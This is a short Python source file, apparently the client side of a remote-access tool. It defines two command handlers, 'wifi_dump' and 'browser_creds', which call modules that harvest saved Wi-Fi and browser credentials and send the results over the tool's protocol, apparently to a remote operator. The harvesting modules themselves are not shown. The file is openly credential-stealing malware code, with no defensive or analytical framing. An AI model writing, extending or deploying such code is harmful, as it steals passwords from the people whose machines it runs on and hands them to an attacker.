from client.commands.base import Command


class WifiDumpCommand(Command):
    name = 'wifi_dump'

    def execute(self, ctx, raw: str):
        from client.modules.credentials.wifi import wifi_dump
        ctx.protocol.send(wifi_dump())
        return True


class BrowserCredsCommand(Command):
    name = 'browser_creds'

    def execute(self, ctx, raw: str):
        from client.modules.credentials.browser import browser_credentials
        ctx.protocol.send(browser_credentials())
        return True
